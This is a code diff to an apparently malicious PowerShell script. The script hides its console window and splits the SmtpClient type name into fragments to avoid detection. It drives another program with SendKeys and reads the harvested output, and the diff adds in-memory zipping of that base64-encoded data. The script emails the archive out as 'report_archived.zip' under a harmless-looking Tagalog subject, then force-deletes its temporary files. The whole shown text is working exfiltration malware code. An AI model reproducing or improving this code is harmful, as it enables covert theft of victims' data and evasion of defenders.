@@ -1,7 +1,8 @@
 try {
     $v_ms = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
-    # $v_type = Add-Type -MemberDefinition $v_ms -Name "W32S" -Namespace "W3" -PassThru
     $v_type = Add-Type -MemberDefinition $v_ms -Name ("W32S" + (Get-Random)) -Namespace "W3" -PassThru
+    Add-Type -AssemblyName "System.IO.Compression"
+    Add-Type -AssemblyName "System.IO.Compression.FileSystem"
     $v_type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
     $v_sc = ("Net.M" + "ail.Smtp" + "Client")
@@ -77,29 +78,35 @@ try {
     [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
     Start-Sleep -Milliseconds 500
 
-    # --- 5. ENCODE & EXFIL ---
     if ($v_p) { Stop-Process -Id $v_p.Id -Force }
     
     if (Test-Path $v_out) {
-        # READ RAW DATA
+        Add-Type -AssemblyName "System.IO.Compression"
+        
         $r_raw = Get-Content $v_out -Raw
         $currentDate = Get-Date -Format 'yyyy-MM-dd HH:mm'
         
-        # --- BASE64 ENCODING START ---
         $v_bytes  = [System.Text.Encoding]::UTF8.GetBytes($r_raw)
         $v_base64 = [System.Convert]::ToBase64String($v_bytes)
-        # --- BASE64 ENCODING END ---
 
-        # WRITE ENCODED DATA TO MEMORY STREAM
         $ms = New-Object System.IO.MemoryStream
-        $sw = New-Object System.IO.StreamWriter($ms)
-        $sw.Write($v_base64) 
-        $sw.Flush()
+        
+        $zip = New-Object System.IO.Compression.ZipArchive($ms, [System.IO.Compression.ZipArchiveMode]::Create, $true)
+        
+        $entry = $zip.CreateEntry("anihan.txt")
+        $writer = New-Object System.IO.StreamWriter($entry.Open())
+        $writer.Write($v_base64)
+        
+        $writer.Dispose()
+        $zip.Dispose()
+        
         $ms.Position = 0
         
-        $v_at = New-Object Net.Mail.Attachment($ms, "anihan.txt")
+        $v_at = New-Object Net.Mail.Attachment($ms, "report_archived.zip")
         Send-V-Mail -sb "Ang pagaani sa bukirin - $currentDate" -at $v_at
+        
         $v_at.Dispose()
+        $ms.Dispose()
     }
 
     Remove-Item $v_txt, $v_exe, $v_out -Force -ErrorAction SilentlyContinue
